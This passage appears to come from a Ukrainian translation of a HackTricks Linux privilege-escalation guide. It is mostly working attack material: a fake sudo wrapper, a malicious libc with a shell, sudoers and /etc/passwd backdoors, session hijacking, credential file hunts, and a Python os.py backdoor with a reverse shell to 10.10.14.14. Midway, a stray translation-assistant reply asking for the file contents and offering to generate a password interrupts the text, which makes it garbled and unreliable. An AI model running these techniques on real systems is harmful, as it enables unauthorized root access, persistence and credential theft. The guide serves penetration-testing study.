echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Існують деякі альтернативи бінарному файлу `sudo`, такі як `doas` для OpenBSD — не забудьте перевірити його конфігурацію в `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Якщо ви знаєте, що **user зазвичай підключається до машини і використовує `sudo`** для ескалації привілеїв і ви отримали shell у контексті цього user, ви можете **створити новий sudo executable**, який виконуватиме ваш код від імені root, а потім команду користувача. Потім **змініть $PATH** у user context (наприклад, додавши новий шлях у .bash_profile), щоб коли user виконає sudo, виконувався ваш sudo executable.

Зверніть увагу, що якщо user використовує інший shell (не bash), вам доведеться змінити інші файли, щоб додати новий шлях. Наприклад[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) змінює `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Інший приклад можна знайти в [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Або запустивши щось на зразок:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Спільна бібліотека

### ld.so

Файл `/etc/ld.so.conf` вказує, **звідки беруться завантажені конфігураційні файли**. Зазвичай цей файл містить наступний шлях: `include /etc/ld.so.conf.d/*.conf`

Це означає, що будуть прочитані конфігураційні файли з `/etc/ld.so.conf.d/*.conf`. Ці конфігураційні файли **вказують на інші папки**, де будуть **шукатися** **бібліотеки**. Наприклад, вміст `/etc/ld.so.conf.d/libc.conf` — `/usr/local/lib`. **Це означає, що система шукатиме бібліотеки всередині `/usr/local/lib`**.

Якщо з якоїсь причини **користувач має права на запис** в будь-який з вказаних шляхів: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, будь-який файл всередині `/etc/ld.so.conf.d/` або будь-яку папку, вказану в конфігураційному файлі `/etc/ld.so.conf.d/*.conf` він може підвищити привілеї.\
Перегляньте **як експлуатувати цю неправильну конфігурацію** на наступній сторінці:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Скопіювавши lib у `/var/tmp/flag15/`, програма використовуватиме її саме з цього місця, як вказано в змінній `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Потім створіть зловмисну бібліотеку в `/var/tmp` за допомогою `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Можливості

Linux capabilities надають процесу **підмножину доступних привілеїв root**. Це фактично розбиває привілеї root на **менші й відмінні одиниці**. Кожну з цих одиниць можна потім незалежно надавати процесам. Таким чином повний набір привілеїв зменшується, що знижує ризики експлуатації.\
Read the following page to **learn more about capabilities and how to abuse them**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Дозволи директорії

У директорії, **біт "execute"** означає, що відповідний користувач може **"cd"** у папку.\
Біт **"read"** означає, що користувач може **list** **files**, а біт **"write"** означає, що користувач може **delete** та **create** нові **files**.

## ACLs

Списки контролю доступу (ACLs) є вторинним шаром дискреційних дозволів, здатним **перевизначати традиційні ugo/rwx дозволи**. Ці дозволи покращують контроль доступу до файлів або директорій, дозволяючи або забороняючи права конкретним користувачам, які не є власниками або частиною групи. Такий рівень **деталізації забезпечує більш точне управління доступом**. Більше деталей можна знайти [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Надати** користувачу "kali" права читання та запису для файлу:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Отримати** файли з певними ACLs з системи:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Прихований ACL backdoor у sudoers drop-ins

Поширеною помилковою конфігурацією є файл, що належить root у `/etc/sudoers.d/` з режимом `440`, який все ще надає права запису користувачу з низькими привілеями через ACL.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Якщо ви бачите щось на кшталт `user:alice:rw-`, користувач може додати правило sudo незважаючи на обмежувальні біти режиму:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Це шлях високого впливу для ACL persistence/privesc, оскільки його легко пропустити при огляді лише за допомогою `ls -l`.

## Відкриті shell sessions

У **старих версіях** ви можете **hijack** деяку **shell** session іншого користувача (**root**).\
У **новіших версіях** ви зможете **connect** до screen sessions лише свого **your own user**. Однак ви можете знайти **цікаву інформацію всередині session**.

### screen sessions hijacking

**Переглянути screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**Приєднатися до сесії**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Перехоплення сесій tmux

Це була проблема зі **старими версіями tmux**. Мені не вдалося перехопити сесію tmux (v2.1), створену root, будучи непривілейованим користувачем.

**Перелік сесій tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Приєднатися до сесії**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Усі SSL та SSH ключі, згенеровані на системах на базі Debian (Ubuntu, Kubuntu тощо) між вереснем 2006 та 13 травня 2008 року можуть бути уражені цією вразливістю.\
Ця вразливість виникає при створенні нового ssh key у цих ОС, оскільки **було можливим лише 32,768 варіантів**. Це означає, що всі можливості можна перерахувати і **маючи ssh public key ви можете знайти відповідний private key**. Ви можете знайти розраховані варіанти тут: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Визначає, чи дозволена автентифікація за паролем. За замовчуванням `no`.
- **PubkeyAuthentication:** Визначає, чи дозволена автентифікація за публічним ключем. За замовчуванням `yes`.
- **PermitEmptyPasswords**: Коли дозволена автентифікація за паролем, визначає, чи дозволяє сервер вхід в облікові записи з порожнім рядком пароля. За замовчуванням `no`.

### Login control files

Ці файли впливають на те, хто може увійти і як:

- **`/etc/nologin`**: якщо присутній, блокує входи не-root користувачів і виводить своє повідомлення.
- **`/etc/securetty`**: обмежує звідки root може входити (список дозволених TTY).
- **`/etc/motd`**: банер після входу (може leak інформацію про середовище або деталі обслуговування).

### PermitRootLogin

Визначає, чи може root входити через ssh, за замовчуванням `no`. Можливі значення:

- `yes`: root може увійти за допомогою password та private key
- `without-password` or `prohibit-password`: root може входити лише з private key
- `forced-commands-only`: root може входити лише з private key і лише якщо задані опції команд
- `no` : заборонено

### AuthorizedKeysFile

Визначає файли, що містять public keys, які можуть використовуватись для автентифікації користувача. Він може містити токени такі як `%h`, які будуть замінені на домашній каталог. **Ви можете вказувати абсолютні шляхи** (починаються з `/`) або **відносні шляхи від домашнього каталогу користувача**. Наприклад:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Та конфігурація вкаже, що якщо ви спробуєте увійти, використовуючи **private** key користувача «**testusername**», ssh порівняє public key вашого key з тими, що розташовані в `/home/testusername/.ssh/authorized_keys` та `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding дозволяє вам **use your local SSH keys instead of leaving keys** (without passphrases!) sitting on your server. Отже, ви зможете **jump** via ssh **to a host** і звідти **jump to another** host **using** the **key** located in your **initial host**.

Вам потрібно встановити цю опцію в `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
Зверніть увагу, що якщо `Host` рівний `*`, щоразу, коли користувач переходить на іншу машину, цей хост зможе отримати доступ до ключів (що є проблемою безпеки).

Файл `/etc/ssh_config` може **перевизначати** ці **опції** та дозволяти або забороняти цю конфігурацію.\ The file `/etc/sshd_config` can **allow** or **denied** ssh-agent forwarding with the keyword `AllowAgentForwarding` (default is allow).

Якщо ви виявите, що Forward Agent налаштовано в середовищі, прочитайте наступну сторінку, оскільки **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Цікаві файли

### Файли профілів

Файл `/etc/profile` та файли в `/etc/profile.d/` — це **скрипти, які виконуються, коли користувач запускає нову shell**. Тому, якщо ви можете **записати або змінити будь-який із них, ви можете escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Якщо знайдено підозрілий профільний скрипт, перевірте його на наявність **чутливих даних**.

### Файли passwd/shadow

Залежно від ОС файли `/etc/passwd` та `/etc/shadow` можуть мати іншу назву або існувати їхні резервні копії. Тому рекомендовано **знайти всі** та **перевірити, чи можете їх прочитати**, щоб побачити **чи є всередині хеші**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
У деяких випадках у файлі `/etc/passwd` (або еквівалентному) можна знайти **password hashes**
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Файл /etc/passwd доступний для запису

Спочатку згенеруйте password за допомогою однієї з наступних команд.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Я не бачу вмісту файлу src/linux-hardening/privilege-escalation/README.md. Будь ласка, вставте сюди вміст файлу або дозвольте мені доступ до нього — тоді я переведу текст англійською → українською, зберігаючи точно всю markdown/HTML синтаксис і незмінними теги/посилання/шляхи, як ви просили.

Також уточніть, будь ласка:
- Чи згенерувати пароль для користувача hacker автоматично, і якщо так — яку довжину/символи ви бажаєте (наприклад, 16 символів, включно зі спеціальними символами)?
- Де додати цього користувача і пароль: 
  - додати рядок(и) прямо у відредагований README (наприклад, "user: hacker / password: XXXXX"), або
  - додати інструкцію/команди для створення користувача на системі (напр., useradd + chpasswd)?

За замовчуванням я згенерую 16-символьний сильний пароль і додам у перекладений файл секцію з користувачем hacker та паролем (як текст). Якщо хочете інші опції — скажіть.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Наприклад: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Тепер ви можете використати команду `su` з обліковими даними `hacker:hacker`

Альтернативно, ви можете використати наведені нижче рядки, щоб додати фіктивного користувача без пароля.\
УВАГА: це може послабити поточну безпеку машини.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
ПРИМІТКА: На BSD-платформах `/etc/passwd` знаходиться в `/etc/pwd.db` та `/etc/master.passwd`, також `/etc/shadow` перейменовано в `/etc/spwd.db`.

Ви повинні перевірити, чи можете ви **записувати в деякі чутливі файли**. Наприклад, чи можете ви записати в якийсь **файл конфігурації сервісу**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Наприклад, якщо на машині запущено сервер **tomcat** і ви можете **змінити файл конфігурації служби Tomcat всередині /etc/systemd/,** тоді ви можете змінити рядки:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Ваш backdoor буде виконаний наступного разу, коли tomcat буде запущено.

### Check Folders

Наступні папки можуть містити резервні копії або цікаву інформацію: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Ймовірно, ви не зможете прочитати останню, але спробуйте)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Дивні розташування/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Змінені файли за останні хвилини
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB файли
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml файли
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Приховані файли
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Скрипти/бінарні файли в PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Веб-файли**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Резервні копії**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Відомі файли, що містять паролі

Перегляньте код [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), він шукає **кілька можливих файлів, які можуть містити паролі**.\
**Інший цікавий інструмент**, який ви можете використати для цього: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — це додаток з відкритим кодом, що використовується для отримання великої кількості паролів, збережених на локальному комп'ютері для Windows, Linux & Mac.

### Логи

Якщо ви можете читати логи, можливо, ви зможете знайти в них **цікаву/конфіденційну інформацію**. Чим дивніший лог, тим цікавішим він (ймовірно).\
Також, деякі "**погано**" налаштовані (backdoored?) **audit logs** можуть дозволити вам **записувати паролі** всередині audit logs, як пояснено в цій публікації: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Щоб **читати логи**, група [**adm**](interesting-groups-linux-pe/index.html#adm-group) буде дуже корисною.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Вам також слід перевіряти файли, що містять слово "**password**" у їх **назві** або всередині **вмісту**, а також шукати IP-адреси та електронні адреси в логах або хеші за допомогою регулярних виразів.\
Я не буду перелічувати тут, як робити все це, але якщо вас цікавить, можете переглянути останні перевірки, які виконує [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Writable files

### Python library hijacking

Якщо ви знаєте, **звідки** буде виконуватися python-скрипт і ви **можете записувати всередину** тієї папки або можете **модифікувати python libraries**, ви можете змінити бібліотеку os і backdoor її (якщо ви можете записувати в те місце, звідки буде виконуватися python-скрипт, скопіюйте та вставте бібліотеку os.py).

Щоб **backdoor the library** просто додайте в кінець бібліотеки os.py наступний рядок (змініть IP та PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Експлуатація logrotate

Уразливість в `logrotate` дозволяє користувачам з **правами запису** на файл логу або його батьківські директорії потенційно отримати підвищені привілеї. Це відбувається тому, що `logrotate`, який часто працює як **root**, можна підманіпулювати для виконання довільних файлів, особливо в директоріях на кшталт _**/etc/bash_completion.d/**_. Важливо перевіряти права не лише в _/var/log_, але й у будь-якій директорії, де застосовується ротація логів.

> [!TIP]
> Ця уразливість впливає на версії `logrotate` `3.18.0` та старіші

Детальнішу інформацію про уразливість можна знайти на цій сторінці: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Ви можете експлуатувати цю уразливість за допомогою [**logrotten**](https://github.com/whotwagner/logrotten).

Ця уразливість дуже схожа на [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** тому коли ви виявите, що можете змінювати логи, перевірте, хто їх обслуговує, і чи можна підвищити привілеї, підставивши логи замість цього symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Якщо з якоїсь причини користувач може **записати** скрипт `ifcf-<whatever>` у _/etc/sysconfig/network-scripts_ **або** може **внести зміни** в існуючий, то ваша **система скомпрометована**.

Network scripts, _ifcg-eth0_ наприклад, використовуються для мережевих підключень. Вони виглядають точно як .INI файли. Проте вони ~sourced~ в Linux Network Manager (dispatcher.d).

У моєму випадку атрибут `NAME=` у цих мережевих скриптах обробляється некоректно. Якщо в імені є **пробіл/білій простір**, система намагається виконати частину після пробілу. Це означає, що **все після першого пробілу виконується як root**.

Наприклад: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Зверніть увагу на пробіл між Network та /bin/id_)

### **init, init.d, systemd та rc.d**

Директорія `/etc/init.d` містить **скрипти** для System V init (SysVinit), **класичної системи керування сервісами в Linux**. Вона включає скрипти для `start`, `stop`, `restart`, а іноді й `reload` сервісів. Ці скрипти можна виконувати безпосередньо або через символічні посилання в `/etc/rc?.d/`. Альтернативний шлях в системах Redhat — `/etc/rc.d/init.d`.

З іншого боку, `/etc/init` пов'язана з **Upstart**, новішою системою **керування сервісами**, запровадженою Ubuntu, яка використовує конфігураційні файли для задач керування сервісами. Незважаючи на перехід на Upstart, скрипти SysVinit все ще використовуються поряд з конфігураціями Upstart завдяки шару сумісності в Upstart.

**systemd** постає як сучасний ініціалізатор і менеджер сервісів, що пропонує розширені можливості, такі як запуск демонів за вимогою, керування automount та знімки стану системи. Він розподіляє файли в `/usr/lib/systemd/` для пакетів дистрибутива і в `/etc/systemd/system/` для змін адміністратора, спрощуючи адміністрування системи.

## Інші трюки

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks зазвичай перехоплюють syscall, щоб надати привілейований доступ до функціоналу ядра userspace-менеджеру. Слабка автентифікація менеджера (наприклад, перевірки підпису на основі FD-order або погані схеми паролів) може дозволити локальному додатку видавати себе за менеджера та підвищити привілеї до root на вже rooted-пристроях. Детальніше та техніки експлуатації дивіться тут:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery в VMware Tools/Aria Operations може витягувати шлях до бінарника з командних рядків процесів і виконувати його з параметром -v у привілейованому контексті. Дозволяючі шаблони (наприклад, використовуючи \S) можуть відповідати підготовленим зловмисником лістенерам у записуваних локаціях (наприклад, /tmp/httpd), що призводить до виконання від імені root (CWE-426 Untrusted Search Path).

Дізнайтеся більше і подивіться узагальнений патерн, застосовний до інших стеків discovery/monitoring, тут:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Захист ядра

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Додаткова допомога

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Найкращий інструмент для пошуку Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Перелічує вразливості ядра в Linux та macOS [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)

{{#include ../../banners/hacktricks-training.md}}
